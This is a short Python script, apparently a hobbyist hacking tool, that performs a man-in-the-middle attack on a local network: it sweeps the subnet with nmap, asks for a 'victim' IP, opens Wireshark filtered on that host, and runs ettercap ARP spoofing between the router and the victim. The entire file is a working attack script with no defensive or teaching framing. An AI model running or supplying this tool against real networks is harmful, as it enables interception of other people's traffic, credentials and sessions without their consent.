import os
import time
from scapy.all import ARP, Ether, srp
from colorama import Fore, Style, init
import netifaces as ni
import subprocess

init()
logo = (f"{Fore.CYAN} ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░ \n"
        f"░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     \n"
        f"░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     \n"
        f"░▒▓████████▓▒░░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     \n"
        f"░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     \n"
        f"░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     \n"
        f"░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░   ░▒▓█▓▒░     {Style.RESET_ALL}")

def get_ip_address():
    try:
        interfaces = ni.interfaces()
        for interface in interfaces:
            if interface != 'lo' and ni.AF_INET in ni.ifaddresses(interface):
                ip_address = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
                return ip_address
    except Exception as e:
        print("Error occurred:", e)
    return None

def get_router_ip_address():
    try:
        gateway_info = ni.gateways()
        gateway_ip = gateway_info['default'][ni.AF_INET][0]
        return gateway_ip
    except Exception as e:
        print("Error occurred:", e)
    return None

def get_connected_subnet():
    try:
        interfaces = ni.interfaces()
        for interface in interfaces:
            if interface != 'lo' and ni.AF_INET in ni.ifaddresses(interface):
                ip_info = ni.ifaddresses(interface)[ni.AF_INET][0]
                ip_address = ip_info['addr']
                subnet_mask = ip_info['netmask']
                ip_binary = ''.join(format(int(octet), '08b') for octet in ip_address.split('.'))
                subnet_binary = ''.join(format(int(octet), '08b') for octet in subnet_mask.split('.'))
                prefix_len = sum(1 for i in range(len(subnet_binary)) if subnet_binary[i] == '1')
                network_address_binary = ip_binary[:prefix_len] + '0' * (32 - prefix_len)
                network_address = '.'.join(str(int(network_address_binary[i:i+8], 2)) for i in range(0, 32, 8))
                subnet_cidr = f"{network_address}/{prefix_len}"
                return subnet_cidr
    except:
        print("an error occured")

def main():
    print(logo)
    print(f"{Fore.CYAN}Man In The Middle Attack{Style.RESET_ALL}")
    print('works with "sudo"')
    time.sleep(1)
    os.system('ip r')
    router_ip = get_router_ip_address()
    target_subnet = get_connected_subnet()
    os.system('nmap -sn {}\n'.format(target_subnet))
    time.sleep(0.5)
    victim = input('enter the victim ip address\n')
    subprocess.Popen(["wireshark","-f","host {}".format(victim)])
    os.system("sudo ettercap -T -S -i wlan0 -M arp:remote /{}// //{}/".format(router_ip,victim))

main()
